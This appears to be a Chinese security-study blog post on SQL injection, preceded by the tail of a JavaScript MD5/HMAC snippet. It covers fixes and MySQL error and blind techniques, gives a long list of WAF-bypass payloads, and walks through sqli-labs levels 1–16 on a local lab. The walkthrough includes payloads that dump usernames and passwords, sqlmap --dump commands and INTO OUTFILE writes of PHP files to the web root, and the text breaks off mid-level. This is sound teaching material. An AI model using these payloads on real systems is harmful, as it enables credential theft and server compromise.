<span class=\"number\">8</span>) &#123;</span><br><span class=\"line\">                i[u &gt;&gt; <span class=\"number\">5</span>] |= (n.<span class=\"title function_\">charCodeAt</span>(u / <span class=\"number\">8</span>) &amp; <span class=\"number\">255</span>) &lt;&lt; u % <span class=\"number\">32</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">$</span>(<span class=\"params\">n</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">L</span>(<span class=\"title function_\">f</span>(<span class=\"title function_\">y</span>(n), n.<span class=\"property\">length</span> * <span class=\"number\">8</span>))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">q</span>(<span class=\"params\">n, u</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> i, b = <span class=\"title function_\">y</span>(n), S = [], j = [], F;</span><br><span class=\"line\">            S[<span class=\"number\">15</span>] = j[<span class=\"number\">15</span>] = <span class=\"keyword\">void</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (b.<span class=\"property\">length</span> &gt; <span class=\"number\">16</span>) &#123;</span><br><span class=\"line\">                b = <span class=\"title function_\">f</span>(b, n.<span class=\"property\">length</span> * <span class=\"number\">8</span>)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">16</span>; i += <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                S[i] = b[i] ^ <span class=\"number\">909522486</span>;</span><br><span class=\"line\">                j[i] = b[i] ^ <span class=\"number\">1549556828</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            F = <span class=\"title function_\">f</span>(S.<span class=\"title function_\">concat</span>(<span class=\"title function_\">y</span>(u)), <span class=\"number\">512</span> + u.<span class=\"property\">length</span> * <span class=\"number\">8</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">L</span>(<span class=\"title function_\">f</span>(j.<span class=\"title function_\">concat</span>(F), <span class=\"number\">512</span> + <span class=\"number\">128</span>))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">z</span>(<span class=\"params\">n</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> u = <span class=\"string\">&quot;0123456789abcdef&quot;</span>, i = <span class=\"string\">&quot;&quot;</span>, b, S;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (S = <span class=\"number\">0</span>; S &lt; n.<span class=\"property\">length</span>; S += <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                b = n.<span class=\"title function_\">charCodeAt</span>(S);</span><br><span class=\"line\">                i += u.<span class=\"title function_\">charAt</span>(b &gt;&gt;&gt; <span class=\"number\">4</span> &amp; <span class=\"number\">15</span>) + u.<span class=\"title function_\">charAt</span>(b &amp; <span class=\"number\">15</span>)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">Q</span>(<span class=\"params\">n</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">unescape</span>(<span class=\"built_in\">encodeURIComponent</span>(n))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">B</span>(<span class=\"params\">n</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> $(<span class=\"title function_\">Q</span>(n))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">x</span>(<span class=\"params\">n</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">z</span>(<span class=\"title function_\">B</span>(n))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">M</span>(<span class=\"params\">n, u</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">q</span>(<span class=\"title function_\">Q</span>(n), <span class=\"title function_\">Q</span>(u))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">R</span>(<span class=\"params\">n, u</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">z</span>(<span class=\"title function_\">M</span>(n, u))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        getStr = <span class=\"keyword\">function</span>(<span class=\"params\">n, u, i</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!u) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!i) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"title function_\">x</span>(n)</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"title function_\">B</span>(n)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!i) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"title function_\">R</span>(u, n)</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"title function_\">M</span>(u, n)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        .<span class=\"title function_\">call</span>(T, h, T, I),</span><br><span class=\"line\">    v !== <span class=\"keyword\">void</span> <span class=\"number\">0</span> &amp;&amp; (I.<span class=\"property\">exports</span> = v))</span><br><span class=\"line\">&#125;()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> password = <span class=\"string\">&quot;1234&quot;</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"title function_\">getStr</span>(password.<span class=\"title function_\">substr</span>(<span class=\"number\">0</span>, <span class=\"number\">16</span>)))</span><br><span class=\"line\"><span class=\"comment\">// 81dc9bdb52d04dc20036dbd8313ed055</span></span><br></pre></td></tr></table></figure>\n"},{"title":"sql注入","hide":false,"abbrlink":31899,"date":"2025-03-04T14:43:25.000Z","_content":"\n\n\n## 1. 概述\n\n**漏洞描述**\n\n​\tWeb程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。\n\n**漏洞存在条件**\n\n- 参数用户可控。\n- 参数带入数据库查询。\n\n**测试方法**\n\n​\t在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1=1 和 and 1=2 以及字符型注入进行判断。\n\n**修复方法**\n\n​\t在代码层最佳的防御SQL注入的手段是SQL语句的**预编译和绑定变量**。\n\n​\t（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。\n\n​\t（2）对进入数据库的特殊字符（ ' <>&*; 等）进行转义处理，或编码转换。\n\n​\t（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。\n\n​\t（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 \n\n​\t（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 \n\n​\t（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 \n\n​\t（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。\n\n\n\n### 1.1 MySQL相关知识\n\n​\t在**mysql5**版本以后，存在一个数据库为`information_schema`，在这个库里面，有三个重要的表：`columns`，`tables`，`SCHEMATA`表，在`SCHEMATA`表中的字段`SCHEMA_NAME`存放着数据库的信息。`tables`表中`TABLE_SCHEMA`和`TABLE_NAME`分别记录库名和表名。`columns`存储该用户创建的所有数据库的库名、表名和字段名。\n\n#### 1.1.1 Navicat连接Docker容器内MySQL\n\n> 有这个需求的原因是我太懒了，因为是用的docker开的sqli labs环境，又不想本地再配MySQL环境，因此干脆直接利用了。\n\n```bash\n$ docker run -dt --name sqli-labs -p 8888:80 -p 3307:3306 -e MYSQL_ROOT_PASSWORD=root acgpiano/sqli-labs:latest\n```\n\n这里需要给MySQL开一个端口映射，我这里给的是`3307`端口。\n\n```bash\n$ docker exec -it sqli-labs /bin/bash\n$ mysql\n```\n\n接下来将host修改为`%`即可。\n\n```sql\nselect host,user from user where user='root';\nFLUSH PRIVILEGES;\n```\n\n<img src=\"sql注入/image-20250306000604769.png\" alt=\"image-20250306000604769\" style=\"zoom:50%;\" />\n\n\n### 1.2 判断是否存在注入\n\n```sql\nid=1 and 1=1\nid=1 and 1=2\nid=1 or 1=1\nid='1'or'1'='1'\nid=\"1\"or\"1\"=\"1\"\n```\n\n**有回显**：页面有数据信息返回。\n\n**无回显**：输入不同语句，页面无任何变化。\n\n\n\n### 1.3 SQL注释符\n\n`#`：单行注释，常编码为%23。\n\n`--空格`：单行注释，注意后面有个空格。\n\n`/**/`：多行注释，至少存在两处的注入，也常用来作为空格绕过。\n\n\n\n### 1.4 SQL注入分类\n\n按注入手法来分：**联合查询、堆叠查询、布尔型、报错型、基于时间延迟**。\n\n按请求类型来分：**GET注入、POST注入、COOKIE注入。**\n\n按注入数据类型来分：**int型、string型、like型**\n\n\n\n#### 1.4.1 报错注入\n\n**XPATH报错注入**\n\n`updatexml（XML_document，XPath_string，new_value）`、`extractvalue（XML_document，xpath_string）`，XPATH的格式形如`/test`，如果XPATH出现格式错误，则会爆出XPATH语法错误。\n\n**floor()函数报错**\n\n```sql\nselect count(*),concat('x',floor(rand(0)*2))x from information_schema.tables group by x\n```\n\n`rand(0)`的重复计算是固定的，会随机生成一个[0,1]的小数，`rand(0)*2`则生成[0,2]的数，`floor()`函数是向下取整，即最后结果为0或1。我们运行一下看看。\n\n```sql\nselect floor(rand(0)*2) from information_schema.tables limit 0,8;\n```\n\n![image-20250306001213412](sql注入/image-20250306001213412.png)\n\n可以发现这里`floor(rand(0)*2)`的值是固定的。\n\n接下来说一下`group by`的原理，`group by`在执行时，会依次取出查询表中的记录创建一个临时表，`group by`的对象就是该临时表的主键，如果临时表中出现了该主键，则该值加一，若不存在则**插入**。再来看这个SQL语句。\n\n```sql\nselect count(*),concat('x',floor(rand(0)*2))x from information_schema.tables group by x\n```\n\n其键必然为`x1`或者`x0`，那么应该只会值增加呀，为什么会报错呢？\n\n这里有个重要特性：当`group by`和`rand()`同时使用时，若该临时表中没有主键，则插入前`rand()`会再执行一次。\n\n那么我们来推断一下，第一次执行，`key`应该为`x0`，但是`x0`不存在，因此`rand(0)`又计算了一遍，最终第一次执行结果为`x1`。\n\n第二次执行，这时候`key`应该为`x1`，已存在，则值加一即可。\n\n第三次执行，这时候key应该为`x0`，不存在，`rand(0)`重新计算一遍，最终应该插入的`key`为`x1`，这里就出了问题了，它会直接插入，从而导致主键重复报错，这就是该报错原理。\n\n![image-20250306003105176](sql注入/image-20250306003105176.png)\n\n**优化方案**\n\n学习的[这篇文章](https://www.freebuf.com/articles/web/257881.html)，将`rand(0)`改为了`rand(14)`，运行一下看看。\n\n```sql\nmysql> select floor(rand(14)*2) from information_schema.tables limit 0,8;\n+-------------------+\n| floor(rand(14)*2) |\n+-------------------+\n|                 1 |\n|                 0 |\n|                 1 |\n|                 0 |\n|                 0 |\n|                 0 |\n|                 1 |\n|                 1 |\n+-------------------+\n8 rows in set (0.00 sec)\n```\n\n这里只需要两条数据即可报错，但是如果只有一条数据`floor()`报错注入就不能用了，因为一条数据没办法重复。\n\n\n\n#### 1.4.2 ORDER BY注入\n\n主要是不能使用联合注入，还有一些函数区别。\n\n**验证方式**\n\n升序降序\n\n```sql\n?sort=1 asc # 升序\n?sort=1 desc # 降序\n```\n\n`rand()`函数验证，`rand()`每次结果随机，因此查询出结果顺序也是随机。\n\n```sql\n?sort=rand()\n?sort=1 and rand()\n```\n\n延时验证，延时的时间为 (行数 * 1) 秒\n\n```sql\n?sort=sleep(1)\n?sort=1 and sleep(1)\n```\n\n**利用方式**\n\n报错注入\n\n```sql\n?sort=1 and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23 # floor()\n?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) # procedure analyse\n```\n\n布尔盲注和时间盲注使用`rand()`函数即可\n\n```sql\n?sort=rand(left(database(),1)>'r')\n?sort=rand(if(ascii(substr(database(),1,1))>114,1,sleep(1)))\n```\n\n写入文件，使用`lines terminated by`，`0x3c3f70687020706870696e666f28293b3f3e`是`<php phpinfo();>`的十六进制编码。\n\n```sql\n?sort=1 into outfile \"/var/www/html/less46.php\" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e\n```\n\n\n\n## 2. SQL注入绕过\n\n\n### 2.1 空格字符绕过\n\n`%a0`：空格\n\n`%09`：TAB键（水平）\n\n`%0a`：新建一行\n\n`%0c`：新的一页\n\n`%0d`：return功能\n\n`%0b`：TAB键（垂直）\n\n`%00`：空字符\n\n`/**/`：替换空格\n\n`/*!*/`：内联注释\n\n\n\n### 2.2 大小写绕过\n\n```sql\nunion select -> UniOn SelEcT\n```\n\n\n\n### 2.3 浮点数绕过\n\n```sql\nselect * from users where id=8E0union select 1,2,3,4;\nselect * from users where id=8.0union select 1,2,3,4;\n```\n\n\n\n### 2.4 NULL绕过\n\n`\\N`代表NULL\n\n\n\n### 2.5 引号绕过\n\n```sql\nselect * from users where id=\"1\" #双引号绕过\nselect * from users where username=0x61646D696E; # 字符串转换为16进制\nselect * from users where id=-1 union select 1,2,(select group_concat(column_name)\nfrom information_schema.columns where TABLE_NAME='users' limit 1),4; # 如果开启gpc，整数型也可以用十六进制绕过\n```\n\n\n\n### 2.6 添加库名绕过\n\n```sql\nselect * from users where id=-1 union select 1,2,3,4 from users;\nselect * from users where id=-1 union select 1,2,3,4 from test.users;\n```\n\n\n\n### 2.7 去重复绕过\n\n在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。\n\n```sql\nselect * from users where id=-1 union distinct select 1,2,3,4 from users;\nselect * from users where id=-1 union distinct select 1,2,3,version() fromusers;\n```\n\n\n\n### 2.8 反引号绕过\n\n字段加反引号可以绕过一些WAF拦截。\n\n```sql\nselect * from users where id=-1 union select 1,2,3,4 from `test.users`;\n```\n\n\n\n### 2.9 语言特性绕过\n\n在 php 语言中 id=1&id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。\n\n|               服务器中间件                |          解析结果          |       举例说明       |\n| :---------------------------------------: | :------------------------: | :------------------: |\n|                ASP.NET/IIS                | 所有出现的参数值用逗号连接 |    color=red,blue    |\n|                  ASP/IIS                  |  所有出现的参数用逗号连接  |    color=red,blue    |\n|                PHP/Apache                 |    仅最后一次出现参数值    |      color=blue      |\n|                 PHP/Zeus                  |    仅最后一次出现参数值    |      color=blue      |\n|         JSP,Servlet/Apache Tomcat         |     仅第一次出现参数值     |      color=red       |\n| JSP,Servlet/Oracle Application Server 10g |     仅第一次出现参数值     |      color=red       |\n|             JSP,Servlet/Jetty             |     仅第一次出现参数值     |      color=red       |\n|             IBM Lotus Domino              |    仅最后一次出现参数值    |      color=blue      |\n|              IBM HTTP Server              |     仅第一次出现参数值     |      color=red       |\n|         mod_perl,libapreq2/Apache         |     仅第一次出现参数值     |      color=red       |\n|              Perl CGI/Apache              |     仅第一次出现参数值     |      color=red       |\n|          mod_wsgi(Python)/Apache          |     仅第一次出现参数值     |      color=red       |\n|                Python/Zope                |         转化为List         | color=['red','blue'] |\n\n\n\n### 2.10 逗号绕过\n\n`substr`\n\n```sql\nselect(substr(database() from 1 for 1);\n```\n\n`mid`\n\n```sql\nselect mid(database() from 1 for 1);\n```\n\n`join`\n\n```sql\nunion select * from 1,2\nunion select * from (select 1)a join (select 2)b\n```\n\n`like`\n\n```sql\nselect user() like '%r%';\n```\n\n`offset`\n\n```sql\nlimit 1 offset 0\n```\n\n\n\n### 2.11 or and xor not绕过\n\n`&&`等价于and\n\n`||`等价于or\n\n`!`等价于not\n\n`|`等价于xor\n\n\n\n### 2.12 ASCII字符对比绕过\n\n```sql\nselect * from users where id=1 and ascii(substring(user(),1,1))=114; # char(114)='r'\n```\n\n\n\n### 2.13 等号绕过\n\n```sql\nascii(substring(user(),1,1))<115; # > <\nselect substring(user(),1,1)like 'r%'; #like rlike\nselect user() regexp '^r'; # regexp\n```\n\n\n\n### 2.14 双写绕过\n\n```sql\nuniunionon seleselectct\n```\n\n\n\n### 2.15 二次编码绕过\n\n`-1 union select 1,2,3,4# `\n\n第一次编码：\n\n`%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 `\n\n第二次编码：\n\n`%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33`\n\n\n\n### 2.16 参数拆分绕过\n\n对于a=[input1]&b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了`union select`，可以使用参数拆分\n\n```sql\n-1'union/*&username=*/select 1,user(),3,4--+\n```\n\n\n\n### 2.17 生僻函数绕过\n\n```sql\nselect polygon((select * from (select * from (select @@version) f) x)); # polygon()替换updatexml()\n```\n\n\n\n### 2.18 分块传输绕过\n\n​\t如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。\n\n​\t接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF(\"\\r\\n\")。然后是数据本身，数据结束后，还会有CRLF(\"\\r\\n\")两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。\n\n\n\n### 2.19 信任白名单绕过\n\nWAF会自带一些文件白名单，可以利用白名单绕过\n\n```sql\n/phpmyadmin?name=%27%20union%20select%201,user()--+&submit=1\n```\n\n\n\n### 2.20 pipline绕过\n\n​\thttp协议是由tcp协议封装而来，当浏览器发起一个http请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包（即我们用burpsuite截获的数据），其中包含了一个Connection字段，一般值为close，Apache等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。\n\n​\t用burpsuite抓包提交，复制整个包信息放在第一个包最后，把第一个包close改成keep-alive把brupsuite自动更新Content-Length勾去掉，有些WAF不会对第一个包的参数进行检测。\n\n\n\n### 2.21 利用multipart/form-data绕过\n\n​\tmultipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。\n\n\n\n### 2.22 order by 绕过\n\n```sql\nselect * from users where id=1 into @a,@b,@c,@d; # 替代order by猜解字段数\n```\n\n\n\n### 2.23 修改请求方式绕过\n\n```php\n<?php\necho $_REQUEST['id'];\n?>\n```\n\n可以更改请求方式尝试绕过。\n\n\n\n### 2.24 大量字符绕过\n\n```sql\nid=1 and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*/1,user()\n```\n\n\n\n### 2.25 花括号绕过\n\n```sql\nselect 1,2 union select{x 1},user(); # 花括号左边是注释的内容\n```\n\n\n\n### 2.26 union select绕过\n\n```sql\nsel<>ect # 程序过滤<>为空 脚本处理\nsele/**/ct # 程序过滤/**/为空\n/*!%53eLEct*/ # url 编码与内联注释\nse%0blect # 使用空格绕过\nsele%ct # 使用百分号绕过\n%53eLEct # 编码绕过\nuNIoN sELecT 1,2\nunion all select 1,2\nunion DISTINCT select 1,2\nnull+UNION+SELECT+1,2\n/*!union*//*!select*/1,2\nunion/**/select/**/1,2\nand(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()\n/*!50000union*//*!50000select*/1,2\n/*!40000union*//*!40000select*/1,2\n%0aunion%0aselect 1,2\n%250aunion%250aselect 1,2\n%09union%09select 1,2\n%0caunion%0cselect 1,2\n%0daunion%0dselect 1,2\n%0baunion%0bselect 1,2\n%0d%0aunion%0d%0aselect 1,2\n--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2\n/*!12345union*//*!12345select*/1,2;\n/*中文*/union/*中文*/select/*中文*/1,2;\n/* */union/* */select/ */1,2;\n/*!union*//*!00000all*//*!00000select*/1,2\n```\n\n\n\n\n\n## 3. sqli-labs通关\n\n这里跟着[国光佬](https://www.sqlsec.com/2020/05/sqlilabs.html)学习\n\n### 3.1 准备工作\n\n**sqli-labs环境搭建**\n\n```bash\ndocker pull acgpiano/sqli-labs\ndocker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest\n```\n\n中间可能报错，只需要关闭代理就行。\n\n```bash\nError response from daemon: Head \"https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest\": Get \"https://auth.docker.io/token?account=squarehhh&scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&service=registry.docker.io\": EOF\n```\n\n访问网页，环境搭建完毕。\n\n![image-20250305014536324](sql注入/image-20250305014536324.png)\n\n### 3.2 Less 1-20\n\n#### 3.2.1 Less-1\n\n```php\n$id=$_GET['id'];\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n\nif true\n  \t\"查询结果\"\nelse \n\tprint_r(mysql_error());  \n```\n\n**联合注入**\n\n手工\n\n```sql\n?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23 # 查库\n?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=\"security\")%23 # 查表\n?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=\"users\")%23 # 查字段\n?id=-1' union select 1,2,(select group_concat(username,password SEPARATOR 0x3c62723e) from users)%23 # 0x3c62723e=<br>，即按换行分割\n```\n\nsqlmap\n\n```bash\n$ python sqlmap.py -u \"http://localhost:8888/Less-1/?id=1\" --technique=U -v 3 -D security -T users --dump --batch\n```\n\n**报错注入**\n\n手工\n\n```sql\n?id=1'and updatexml(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e),1)%23\n?id=1'and extractvalue(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23\n?id=1'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23\n```\n\nsqlmap\n\n```bash\n$ python sqlmap.py -u \"http://localhost:8888/Less-1/?id=1\" --technique=E -v 3 -D security -T users --dump --batch\n```\n\n**布尔盲注**\n\n手工\n\n```sql\n?id=1'and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>67 %23 # 有回显\n?id=1'and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68 %23 # 无回显\n```\n\nsqlmap\n\n```bash\n$ python sqlmap.py -u \"http://localhost:8888/Less-1/?id=1\" --technique=B -v 3 -D security -T users --dump --batch\n```\n\n**时间盲注**\n\n手工\n\n```sql\n?id=1'and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68,1,sleep(5)) %23\n```\n\nsqlmap\n\n```bash\n$ python sqlmap.py -u \"http://localhost:8888/Less-1/?id=1\" --technique=T -v 3 -D security -T users --dump --batch\n```\n\n#### 3.2.2 Less-2\n\n```php\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n```\n\n闭合方式改变。\n\n#### 3.2.3 Less-3\n\n```php\n$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n```\n\n闭合方式改变。\n\n#### 3.2.4 Less-4\n\n```php\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n```\n\n闭合方式改变。\n\n#### 3.2.5 Less-5\n\n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nif true\n  \techo 'You are in...........';\nelse \n\tprint_r(mysql_error());\n```\n\n不支持联合查询。\n\n#### 3.2.6 Less-6\n\n```php\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\nif true\n  \techo 'You are in...........';\nelse \n\tprint_r(mysql_error());\n```\n\n闭合方式不一样。\n\n#### 3.2.7 Less-7\n\n```php\n$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\nif true\n  \techo 'You are in.... Use outfile......';\nelse \n\t//print_r(mysql_error());\n    echo \"You have an error in your SQL syntax\";\n```\n\n**布尔盲注**\n\n```sql\n?id=1'))and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>67 %23 //正常回显\n?id=1'))and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68 %23 //报错\n```\n\n**时间盲注**\n\n```sql\n?id=1'))and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))>67,1,sleep(5)) %23 //不延时\n?id=1'))and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68,1,sleep(5)) %23 //延时\n```\n\n**outfile**\n\n这里因为提示`Use outfile`，因此可以尝试写文件。\n\n```bash\n$ mysql -e \"show global variables like '%secure%';\"\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_auth      | OFF   |\n| secure_file_priv |       |\n+------------------+-------+\n```\n\n当`secure_file_priv`为`null`时，表示限制`mysql`不允许导入导出。\n\n当`secure_file_priv`为`/tmp`时，表示限制`mysql`只能在`/tmp`目录下导入导出。\n\n当`secure_file_priv`为`空`时，表示限制`mysql`不对导入导出做限制。\n\n这里还需要赋予文件写入的权限\n\n```bash\n$ chmod -R 777 /var/www/html\n```\n\n然后执行sql语句\n\n```sql\n?id=1'))union select * from security.users into outfile \"/var/www/html/Less-7/user.txt\"%23\n```\n\n![image-20250310220651812](sql注入/image-20250310220651812.png)\n\n这里也可以写入shell\n\n```sql\n?id=1'))union select 1,2,\"<?php phpinfo();?>\" into outfile \"/var/www/html/Less-7/info.php\"%23\n```\n\n![image-20250310220934038](sql注入/image-20250310220934038.png)\n\n#### 3.2.8 Less-8\n\n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nif true\n  \techo 'You are in....';\nelse \n\t//print_r(mysql_error());\n    //echo \"You have an error in your SQL syntax\";\n```\n\n闭合方式改变。\n\n#### 3.2.9 Less-9\n\n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nif true\n  \techo 'You are in....';\nelse \n\techo 'You are in....';\n```\n\n只能用延时注入。\n\n#### 3.2.10 Less-10\n\n```php\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\nif true\n  \techo 'You are in....';\nelse \n\techo 'You are in....';\n```\n\n闭合方式改变。\n\n#### 3.2.11 Less-11\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\nif true\n  \t\"查询结果\"\nelse \n\tprint_r(mysql_error());\n```\n\n与Less-1一致。\n\n#### 3.2.12 Less-12\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\nif true\n  \t\"查询结果\"\nelse \n\tprint_r(mysql_error());\n```\n\n闭合方式改变。\n\n#### 3.2.13 Less-13\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1\";\nif true\n  \t//\"查询结果\"\nelse \n\tprint_r(mysql_error());\t\n```\n\n闭合方式改变，不能用联合查询。\n\n#### 3.2.14 Less-14\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\";\nif true\n  \t//\"查询结果\"\nelse \n\tprint_r(mysql_error());\n```\n\n闭合方式改变。\n\n#### 3.2.15 Less-15\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\nif true\n  \t//\"查询结果\"\nelse \n\t//print_r(mysql_error());\n```\n\n闭合方式改变，不能使用报错。\n\n#### 3.2.16 Less-16\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\nif true\n  \t//\"查询结果\"\nelse 